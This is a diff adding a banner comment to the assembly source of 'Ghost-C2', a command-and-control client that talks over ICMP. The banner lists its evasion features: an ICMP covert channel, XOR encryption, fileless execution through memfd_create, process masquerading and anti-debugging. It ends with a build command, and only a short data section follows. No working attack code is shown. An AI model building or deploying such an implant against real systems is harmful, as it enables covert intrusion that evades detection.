@@ -1,3 +1,31 @@
+; ===================================================================================
+;  ________  ___  ___  ________  ________  _________        ________  ________     
+; |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\     |\   ____\|\_____  \    
+; \ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|     \ \  \___|\|____|\  \   
+;  \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \       \ \  \     ____\_\  \  
+;   \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \       \ \  \___|\____ \  \ 
+;    \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\       \ \______\\_________\
+;     \|_______|\|__|\|__|\|_______|\_________\   \|__|        \|______\|_________|
+;                                   \|_________|                                   
+; ===================================================================================
+; Project      : Ghost-C2 (v3.0.2) - "The Invisible ICMP Phantom"
+; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.blogspot.com/
+; Architecture : x86_64 Linux (Pure Assembly, Libc-free)
+; -----------------------------------------------------------------------------------
+; Features:
+;   - Transport: ICMP Stealth Channel (Asymmetric ID+SEQ Auth: 45k/55k Sum)
+;   - Security: Rolling XOR Encryption (Dynamic Entropy)
+;   - Stealth: Fileless Execution (memfd_create) & Process Masquerading
+;   - Anti-Analysis: ptrace(PTRACE_TRACEME) & prctl(PR_SET_DUMPABLE)
+;   - AND MORE : Adaptive Jitter, RDTSC Mimicry, and Syscall Obfuscation.
+; -----------------------------------------------------------------------------------
+; Disclaimer: This tool is developed for educational and authorized penetration 
+; testing purposes only. The author is not responsible for any misuse.
+; -----------------------------------------------------------------------------------
+; Build: nasm -f elf64 client.asm -o client.o && ld client.o -o client
+; ===================================================================================
+
+
 section .bss
     fd_no resb 4                ; Socket file descriptor
     sniffed_data resb 1200      ; Buffer for received ICMP data
